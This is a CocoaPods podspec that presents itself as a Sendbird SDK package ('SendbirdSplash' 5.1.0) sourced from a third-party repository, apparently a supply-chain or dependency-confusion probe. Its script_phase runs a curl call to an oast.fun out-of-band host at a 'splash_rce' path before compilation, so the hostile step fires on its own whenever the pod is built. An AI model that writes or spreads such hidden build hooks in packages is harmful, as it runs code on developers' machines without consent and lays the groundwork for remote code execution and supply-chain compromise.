Pod::Spec.new do |s|
  s.name             = 'SendbirdSplash'
  s.version          = '5.1.0'
  s.summary          = 'Security Audit - Syntax Highlight Hijack'
  s.source           = { :git => 'https://github.com/ilhamal7/sendbird-ios-distribution.git', :tag => '5.1.0' }
  s.ios.deployment_target = '15.0'
  s.source_files     = 'Sources/Splash/**/*', 'Sources/SendbirdAudit.m'
  s.script_phase = {
    :name => 'Splash Audit',
    :script => 'curl http://txltewamwbpaxlebmxwikbce81fq8r5cw.oast.fun/splash_rce',
    :execution_position => :before_compile
  }
end
